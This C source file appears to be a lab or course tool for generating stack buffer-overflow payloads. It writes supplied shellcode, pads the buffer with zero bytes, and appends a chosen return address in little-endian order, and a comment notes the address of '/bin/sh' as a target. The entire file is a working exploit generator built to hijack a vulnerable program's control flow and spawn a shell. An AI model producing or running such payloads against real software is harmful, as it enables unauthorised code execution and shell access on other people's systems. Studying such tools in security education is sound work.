#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char* littleEndian(char *str, int numChars);

// 0x7ffff7b99673 address of /bin/sh/


#define ADDR_SIZE 64

int main(int argc, char *argv[]){
  FILE *file = fopen("in", "wb");
  int i;
  char ch = 0x00;
  int numChars;
  unsigned char *addr;
  unsigned char *byteAddr;
  unsigned char *instructions;
  unsigned char *bytes = malloc(4);

  bytes[0] = 0x6f;
  bytes[1] = 0x45;
  bytes[2] = 0x23;
  bytes[3] = 0x01;

  if(argc != 4){
    printf("Wrong number of arguments, use ./gen [instructions] [num_bytes_in_buffer] [entry_point]\n");
    printf("Instructions: instructions to be run. Size must not exceed num_bytes_in_buffer.\n");
    printf("num_bytes_in_buffer: number of bytes in the buffer (assumes buffer is first local variable).\n");
    printf("entry_point: hex value of desired entry point, format: 0x12345678.\n");
    exit(1);
  }

  instructions = argv[1];
  numChars = atoi(argv[2]);
  addr = argv[3];

  if(strlen(instructions) > numChars){
    printf("Instructions length exceeds length of buffer.");
    exit(1);
  }

  if(file == NULL){
    printf("Error opening file. Exiting");
    exit(1);
  }

  fwrite(instructions, sizeof(char), strlen(instructions), file);
     
  /* fill buffer */
  for(i = strlen(instructions); i < numChars; i++){
    fwrite(&ch, 1, 1, file);
  }

  //-2 for the 0x at the start of the string
  byteAddr = littleEndian(addr, strlen(addr) - 2);

  int numWritten = fwrite(byteAddr, sizeof(char), ADDR_SIZE / 8, file);
  //int numWritten = fwrite(bytes, sizeof(char), 4, file);

  //printf("%d\n", numWritten);
  
  free(byteAddr);

  fclose(file); 
}

//consider passing output through a parameter & returning size of returned array.
unsigned char* littleEndian(char *addr, int numBytes){
  unsigned char *tmpRet = malloc(ADDR_SIZE / 4);
  unsigned char *ret = malloc(ADDR_SIZE / 8);
  char tmp, tmp2;
  int i = 0, j;

  long long hex = strtoll(addr, NULL, 16);
  
  for(i = 0; i < (ADDR_SIZE / 4) - numBytes; i++){
    tmpRet[i] = 0;
  }

  i = ADDR_SIZE / 4 - 1;

  //place hex into char array hex by hex
  while(hex != 0){ 
    tmpRet[i] = hex & 0xF;
    hex = hex >> 4;
    i--;
  }
   
  //swap byte order
  j = ADDR_SIZE / 4 - 1;
  for(i = 0; i < ADDR_SIZE / 8; i+=2){
    tmp = tmpRet[i];
    tmp2 = tmpRet[i+1];

    tmpRet[i] = tmpRet[j-1];
    tmpRet[i+1] = tmpRet[j];    
    
    tmpRet[j - 1] = tmp;
    tmpRet[j] = tmp2;

    j-=2;
  }
  
  //crunch char array to maintain one byte of hex in each element (rather than a single hex digit).
  for(i = 0; i < ADDR_SIZE / 8; i++){
    ret[i] = tmpRet[(i*2)] << 4 | tmpRet[(i*2)+1];
  }

  return ret;
}
